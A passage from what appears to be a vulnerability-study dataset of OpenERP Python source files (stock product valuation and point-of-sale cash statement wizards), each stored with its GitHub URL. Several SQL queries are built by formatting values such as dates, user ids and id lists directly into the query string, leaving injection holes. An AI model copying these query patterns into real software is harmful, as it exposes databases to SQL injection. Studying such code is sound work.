product.categ_id.\\\n                                    property_stock_account_input_categ.id\n                        if not stock_input_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock input account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * diff\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.name,\n                                    'account_id': stock_input_acc,\n                                    'debit': amount_diff,\n                                    'move_id': move_id,\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.categ_id.name,\n                                    'account_id': account_variation_id,\n                                    'credit': amount_diff,\n                                    'move_id': move_id\n                                    })\n                    elif diff < 0:\n                        if not stock_output_acc:\n                            stock_output_acc = product.product_tmpl_id.\\\n                                property_stock_account_output.id\n                        if not stock_output_acc:\n                            stock_output_acc = product.categ_id.\\\n                                    property_stock_account_output_categ.id\n                        if not stock_output_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock output account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * -diff\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.name,\n                                        'account_id': stock_output_acc,\n                                        'credit': amount_diff,\n                                        'move_id': move_id\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.categ_id.name,\n                                        'account_id': account_variation_id,\n                                        'debit': amount_diff,\n                                        'move_id': move_id\n                                    })\n\n            self.write(cr, uid, rec_id, {'standard_price': new_price})\n\n        return move_ids\n\n    def view_header_get(self, cr, user, view_id, view_type, context=None):\n        if context is None:\n            context = {}\n        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)\n        if res: return res\n        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):\n            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name\n        return res\n\n    def get_product_available(self, cr, uid, ids, context=None):\n        \"\"\" Finds whether product is available or not in particular warehouse.\n        @return: Dictionary of values\n        \"\"\"\n        if context is None:\n            context = {}\n        states = context.get('states',[])\n        what = context.get('what',())\n        if not ids:\n            ids = self.search(cr, uid, [])\n        res = {}.fromkeys(ids, 0.0)\n        if not ids:\n            return res\n\n        if context.get('shop', False):\n            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['warehouse'] = res2[0]\n\n        if context.get('warehouse', False):\n            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['location'] = res2[0]\n\n        if context.get('location', False):\n            if type(context['location']) == type(1):\n                location_ids = [context['location']]\n            elif type(context['location']) in (type(''), type(u'')):\n                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)\n            else:\n                location_ids = context['location']\n        else:\n            location_ids = []\n            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)\n            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):\n                location_ids.append(w.lot_stock_id.id)\n\n        # build the list of ids of children of the location given by id\n        if context.get('compute_child',True):\n            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])\n            location_ids = child_location_ids or location_ids\n        else:\n            location_ids = location_ids\n\n        uoms_o = {}\n        product2uom = {}\n        for product in self.browse(cr, uid, ids, context=context):\n            product2uom[product.id] = product.uom_id.id\n            uoms_o[product.uom_id.id] = product.uom_id\n\n        results = []\n        results2 = []\n\n        from_date=context.get('from_date',False)\n        to_date=context.get('to_date',False)\n        date_str=False\n        if from_date and to_date:\n            date_str=\"date_planned>='%s' and date_planned<='%s'\"%(from_date,to_date)\n        elif from_date:\n            date_str=\"date_planned>='%s'\"%(from_date)\n        elif to_date:\n            date_str=\"date_planned<='%s'\"%(to_date)\n\n        if 'in' in what:\n            # all moves from a location out of the set to a location in the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id NOT IN %s'\\\n                'and location_dest_id IN %s'\\\n                'and product_id IN %s'\\\n                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results = cr.fetchall()\n        if 'out' in what:\n            # all moves from a location in the set to a location out of the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id IN %s'\\\n                'and location_dest_id NOT IN %s '\\\n                'and product_id  IN %s'\\\n                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results2 = cr.fetchall()\n        uom_obj = self.pool.get('product.uom')\n        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)\n        if context.get('uom', False):\n            uoms += [context['uom']]\n\n        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)\n        if uoms:\n            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)\n        for o in uoms:\n            uoms_o[o.id] = o\n        for amount, prod_id, prod_uom in results:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] += amount\n        for amount, prod_id, prod_uom in results2:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] -= amount\n        return res\n\n    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):\n        \"\"\" Finds the incoming and outgoing quantity of product.\n        @return: Dictionary of values\n        \"\"\"\n        if not field_names:\n            field_names = []\n        if context is None:\n            context = {}\n        res = {}\n        for id in ids:\n            res[id] = {}.fromkeys(field_names, 0.0)\n        for f in field_names:\n            c = context.copy()\n            if f == 'qty_available':\n                c.update({ 'states': ('done',), 'what': ('in', 'out') })\n            if f == 'virtual_available':\n                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })\n            if f == 'incoming_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })\n            if f == 'outgoing_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })\n            stock = self.get_product_available(cr, uid, ids, context=c)\n            for id in ids:\n                res[id][f] = stock.get(id, 0.0)\n        return res\n\n    _columns = {\n        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help=\"Current quantities of products in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help=\"Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.\", multi='qty_available'),\n        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help=\"Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help=\"Quantities of products that are planned to leave in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'track_production': fields.boolean('Track Manufacturing Lots' , help=\"Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order\"),\n        'track_incoming': fields.boolean('Track Incoming Lots', help=\"Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location\"),\n        'track_outgoing': fields.boolean('Track Outgoing Lots', help=\"Forces to specify a Production Lot for all moves containing this product and going to a Customer Location\"),\n        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),\n        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),\n                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', \n                                        help=\"If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves.\" \\\n                                             \"The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products.\"\n                                        , required=True),\n    }\n\n    _defaults = {\n        'valuation': lambda *a: 'manual_periodic',\n    }\n\n    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):\n        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)\n        if context is None:\n            context = {}\n        if ('location' in context) and context['location']:\n            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])\n            fields=res.get('fields',{})\n            if fields:\n                if location_info.usage == 'supplier':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Receptions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Received Qty')\n\n                if location_info.usage == 'internal':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Stock')\n\n                if location_info.usage == 'customer':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Deliveries')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Delivered Qty')\n\n                if location_info.usage == 'inventory':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future P&L')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('P&L Qty')\n\n                if location_info.usage == 'procurement':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Qty')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Unplanned Qty')\n\n                if location_info.usage == 'production':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Productions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Produced Qty')\n        return res\n\nproduct_product()\n\nclass product_template(osv.osv):\n    _name = 'product.template'\n    _inherit = 'product.template'\n    _columns = {\n        'property_stock_procurement': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Procurement Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','procurement')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements\"),\n        'property_stock_production': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Production Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','production')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders\"),\n        'property_stock_inventory': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Inventory Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','inventory')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory\"),\n        'property_stock_account_input': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n        'property_stock_account_output': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n    }\n\nproduct_template()\n\nclass product_category(osv.osv):\n\n    _inherit = 'product.category'\n    _columns = {\n        'property_stock_journal': fields.property('account.journal',\n            relation='account.journal', type='many2one',\n            string='Stock journal', method=True, view_load=True,\n            help=\"When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed.\"),\n        'property_stock_account_input_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_account_output_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_variation': fields.property('account.account',\n            type='many2one',\n            relation='account.account',\n            string=\"Stock Variation Account\",\n            method=True, view_load=True,\n            help=\"When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.\",),\n    }\n\nproduct_category()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/MarkusTeufelberger/openobject-addons/blob/979db90c43ba0050400b0a5c8ad5da7ecc2bd76f",
        "file_path": "/point_of_sale/wizard/pos_close_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/MarkusTeufelberger/openobject-addons/blob/979db90c43ba0050400b0a5c8ad5da7ecc2bd76f",
        "file_path": "/point_of_sale/wizard/pos_open_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/MarkusTeufelberger/openobject-addons/blob/4ef053f7e9c6e83304380912ce0ada5f2627ee08",
        "file_path": "/stock/product.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import fields, osv\nfrom tools.translate import _\n\nclass product_product(osv.osv):\n    _inherit = \"product.product\"\n\n    def get_product_accounts(self, cr, uid, product_id, context=None):\n        \"\"\" To get the stock input account, stock output account and stock journal related to product.\n        @param product_id: product id\n        @return: dictionary which contains information regarding stock input account, stock output account and stock journal\n        \"\"\"\n        if context is None:\n            context = {}\n        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)\n\n        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False\n        if not stock_input_acc:\n            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False\n\n        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False\n        if not stock_output_acc:\n            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False\n\n        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False\n        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False\n\n        return {\n            'stock_account_input': stock_input_acc,\n            'stock_account_output': stock_output_acc,\n            'stock_journal': journal_id,\n            'property_stock_variation': account_variation\n        }\n\n    def do_change_standard_price(self, cr, uid, ids, datas, context={}):\n        \"\"\" Changes the Standard Price of Product and creates an account move accordingly.\n        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal\n        @param context: A standard dictionary\n        @return:\n\n        \"\"\"\n        location_obj = self.pool.get('stock.location')\n        move_obj = self.pool.get('account.move')\n        move_line_obj = self.pool.get('account.move.line')\n\n        new_price = datas.get('new_price', 0.0)\n        stock_output_acc = datas.get('stock_output_account', False)\n        stock_input_acc = datas.get('stock_input_account', False)\n        journal_id = datas.get('stock_journal', False)\n        product_obj=self.browse(cr,uid,ids)[0]\n        account_variation = product_obj.categ_id.property_stock_variation\n        account_variation_id = account_variation and account_variation.id or False\n        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))\n        move_ids = []\n        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])\n        for rec_id in ids:\n            for location in location_obj.browse(cr, uid, loc_ids):\n                c = context.copy()\n                c.update({\n                    'location': location.id,\n                    'compute_child': False\n                })\n\n                product = self.browse(cr, uid, rec_id, context=c)\n                qty = product.qty_available\n                diff = product.standard_price - new_price\n                if not diff: raise osv.except_osv(_('Error!'), _(\"Could not find any difference between standard price and new price!\"))\n                if qty:\n                    company_id = location.company_id and location.company_id.id or False\n                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))\n                    #\n                    # Accounting Entries\n                    #\n                    if not journal_id:\n                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False\n                    if not journal_id:\n                        raise osv.except_osv(_('Error!'),\n                            _('There is no journal defined '\\\n                                'on the product category: \"%s\" (id: %d)') % \\\n                                (product.categ_id.name,\n                                    product.categ_id.id,))\n                    move_id = move_obj.create(cr, uid, {\n                                'journal_id': journal_id,\n                                'company_id': company_id\n                                })\n\n                    move_ids.append(move_id)\n\n\n                    if diff > 0:\n                        if not stock_input_acc:\n                            stock_input_acc = product.product_tmpl_id.\\\n                                property_stock_account_input.id\n                        if not stock_input_acc:\n                            stock_input_acc = product.categ_id.\\\n                                    property_stock_account_input_categ.id\n                        if not stock_input_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock input account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * diff\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.name,\n                                    'account_id': stock_input_acc,\n                                    'debit': amount_diff,\n                                    'move_id': move_id,\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.categ_id.name,\n                                    'account_id': account_variation_id,\n                                    'credit': amount_diff,\n                                    'move_id': move_id\n                                    })\n                    elif diff < 0:\n                        if not stock_output_acc:\n                            stock_output_acc = product.product_tmpl_id.\\\n                                property_stock_account_output.id\n                        if not stock_output_acc:\n                            stock_output_acc = product.categ_id.\\\n                                    property_stock_account_output_categ.id\n                        if not stock_output_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock output account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * -diff\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.name,\n                                        'account_id': stock_output_acc,\n                                        'credit': amount_diff,\n                                        'move_id': move_id\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.categ_id.name,\n                                        'account_id': account_variation_id,\n                                        'debit': amount_diff,\n                                        'move_id': move_id\n                                    })\n\n            self.write(cr, uid, rec_id, {'standard_price': new_price})\n\n        return move_ids\n\n    def view_header_get(self, cr, user, view_id, view_type, context=None):\n        if context is None:\n            context = {}\n        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)\n        if res: return res\n        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):\n            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name\n        return res\n\n    def get_product_available(self, cr, uid, ids, context=None):\n        \"\"\" Finds whether product is available or not in particular warehouse.\n        @return: Dictionary of values\n        \"\"\"\n        if context is None:\n            context = {}\n        states = context.get('states',[])\n        what = context.get('what',())\n        if not ids:\n            ids = self.search(cr, uid, [])\n        res = {}.fromkeys(ids, 0.0)\n        if not ids:\n            return res\n\n        if context.get('shop', False):\n            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['warehouse'] = res2[0]\n\n        if context.get('warehouse', False):\n            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['location'] = res2[0]\n\n        if context.get('location', False):\n            if type(context['location']) == type(1):\n                location_ids = [context['location']]\n            elif type(context['location']) in (type(''), type(u'')):\n                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)\n            else:\n                location_ids = context['location']\n        else:\n            location_ids = []\n            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)\n            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):\n                location_ids.append(w.lot_stock_id.id)\n\n        # build the list of ids of children of the location given by id\n        if context.get('compute_child',True):\n            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])\n            location_ids = child_location_ids or location_ids\n        else:\n            location_ids = location_ids\n\n        uoms_o = {}\n        product2uom = {}\n        for product in self.browse(cr, uid, ids, context=context):\n            product2uom[product.id] = product.uom_id.id\n            uoms_o[product.uom_id.id] = product.uom_id\n\n        results = []\n        results2 = []\n\n        from_date=context.get('from_date',False)\n        to_date=context.get('to_date',False)\n        date_str=False\n        if from_date and to_date:\n            date_str=\"date_planned>='%s' and date_planned<='%s'\"%(from_date,to_date)\n        elif from_date:\n            date_str=\"date_planned>='%s'\"%(from_date)\n        elif to_date:\n            date_str=\"date_planned<='%s'\"%(to_date)\n\n        if 'in' in what:\n            # all moves from a location out of the set to a location in the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id NOT IN %s'\\\n                'and location_dest_id IN %s'\\\n                'and product_id IN %s'\\\n                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results = cr.fetchall()\n        if 'out' in what:\n            # all moves from a location in the set to a location out of the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id IN %s'\\\n                'and location_dest_id NOT IN %s '\\\n                'and product_id  IN %s'\\\n                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results2 = cr.fetchall()\n        uom_obj = self.pool.get('product.uom')\n        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)\n        